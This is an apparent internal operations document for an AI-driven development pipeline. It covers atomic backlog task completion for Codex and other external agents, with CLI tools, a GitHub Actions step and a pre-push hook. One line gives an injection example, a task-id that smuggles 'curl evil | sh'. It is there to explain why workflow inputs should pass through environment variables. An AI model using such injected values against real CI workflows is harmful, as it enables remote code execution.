# Codex (and external-agent) Backlog Task Completion

**Audience:** AI-SDLC Pipeline Operator — handling Codex-driven or other
external-agent task executions that do not go through `/ai-sdlc execute`.

**Status:** Operational (AISDLC-203)

---

## The bug pattern (AISDLC-203)

When a Codex-driven or manually-wired agent completes a task, it typically
performs a **copy-only** completion: it creates `backlog/completed/<taskId> - *.md`
without deleting `backlog/tasks/<taskId> - *.md`. The task then appears in
**both** directories simultaneously.

This was observed 5+ times in a single day (AISDLC-175, 181, 184, 191, 197,
201, 203 all needed lifecycle-close PRs as cleanup). Consequences:

- Backlog status queries return ambiguous results (task shows as both open and done).
- PR diffs are misleading — reviewers see a new `completed/` file but no
  corresponding deletion from `tasks/`.
- Future agents can redispatch an already-completed task (if they scan `tasks/`
  for open work).

## The fix: atomic completion helper

`pipeline-cli` now ships two CLI tools that implement the atomic completion contract:

### `cli-task-complete` — atomic move

```bash
node pipeline-cli/bin/cli-task-complete.mjs AISDLC-203
node pipeline-cli/bin/cli-task-complete.mjs AISDLC-203 --work-dir /abs/path/to/repo
```

Steps performed:
1. Locates `backlog/tasks/<taskId-lower> - *.md`.
2. If only in `backlog/completed/` → prints an idempotency notice (exit 2; use
   `--allow-already-done` to exit 0 instead).
3. If in **both** → throws `DuplicateTaskFileError` (exit 1) — you must resolve
   manually first.
4. Patches `status:` in the frontmatter to `Done`.
5. **Moves** (not copies) the file to `backlog/completed/<same-name>.md`.
6. Verifies post-move that the file exists in `completed/` and NOT in `tasks/`.

Exit codes: `0` = success, `1` = error, `2` = already done.

### `cli-backlog-verify` — duplicate-detection gate

```bash
node pipeline-cli/bin/cli-backlog-verify.mjs
node pipeline-cli/bin/cli-backlog-verify.mjs --work-dir /abs/path/to/repo --format json
```

Scans both directories and exits non-zero with a list of duplicate task IDs
when any task appears in both `tasks/` and `completed/`. Wire this as a
pre-push hook gate or CI step to catch copy-only completions before they
land on `main`.

## How to wire these into your completion path

### `/ai-sdlc execute` (slash command body)

The `/ai-sdlc execute` pipeline already performs atomic moves via
`moveTaskToCompleted()` in `pipeline-cli/src/steps/10-finalize.ts`. **No
change needed** for this path.

### External agents (Codex, dogfood, GitHub Actions)

Replace any step that does `cp backlog/tasks/<id>*.md backlog/completed/` with:

```yaml
- name: Complete backlog task atomically
  env:
    TASK_ID: ${{ inputs.task-id }}
  run: node pipeline-cli/bin/cli-task-complete.mjs "$TASK_ID"
```

**Important:** Pass workflow inputs through `env:` and reference them as shell
variables (`"$TASK_ID"`) rather than expanding `${{ inputs.task-id }}` directly
inside `run:`. GitHub Actions expands `${{ }}` BEFORE shell parsing, so a
crafted task-id like `AISDLC-1; curl evil | sh` would execute as a second
command (CWE-78 actions-script-injection). Env-indirection passes the value
through the process environment where it's a literal string, defeating the
injection vector. The bin itself sanitizes input but the call-site convention
matters once `inputs.task-id` is sourced from `issue_comment` / `issues`
triggers where titles, bodies, or labels are attacker-controlled.

**Important:** Do NOT use `pnpm --filter @ai-sdlc/pipeline-cli exec cli-task-complete`.
`pnpm exec` does not resolve a workspace package's own bin entries and silently
fails with `Command not found` (see AISDLC-156 / CLAUDE.md). Always invoke via
`node pipeline-cli/bin/cli-task-complete.mjs`.

### Manual reconciliation (operator)

If a task slipped through and appears in both directories:

```bash
# 1. Verify the problem.
node pipeline-cli/bin/cli-backlog-verify.mjs --work-dir /path/to/repo

# 2. Inspect both files to confirm the completed/ copy is authoritative.
diff "backlog/tasks/aisdlc-XXX - *.md" "backlog/completed/aisdlc-XXX - *.md"

# 3. Delete the tasks/ copy via a lifecycle-close PR.
git rm "backlog/tasks/aisdlc-XXX - <slug>.md"
git commit -m "chore(backlog): remove duplicate aisdlc-XXX from tasks/ (lifecycle close)"
git push origin HEAD
gh pr create --title "chore: lifecycle close AISDLC-XXX duplicate in tasks/"
```

**Do NOT** simply `rm` and push to `main` directly — the PR is the audit trail.

## Reconciliation of AISDLC-201 (regression note)

AISDLC-201 was the first confirmed occurrence of this pattern during a Codex
run. At the time of AISDLC-203 implementation (2026-05-05), AISDLC-201 was
already present **only** in `backlog/completed/` (not in `backlog/tasks/`),
so no file-deletion PR was needed. The duplicate had already been resolved
by a previous lifecycle-close PR.

The `cli-task-complete` + `cli-backlog-verify` tools were designed so that
any future occurrence is detectable immediately (via `DuplicateTaskFileError`
or the verify gate) and fixable in one command rather than requiring a manual
lifecycle-close PR.

## Pre-push hook integration (recommended)

Add to `.husky/pre-push` (after the existing gates):

```bash
# AISDLC-203: detect duplicate task IDs across tasks/ and completed/.
node pipeline-cli/bin/cli-backlog-verify.mjs --quiet || {
  echo "[pre-push] Backlog integrity check failed — duplicate task IDs detected."
  echo "Run: node pipeline-cli/bin/cli-backlog-verify.mjs  (for details)"
  exit 1
}
```

This ensures the copy-only pattern never lands on `main`.
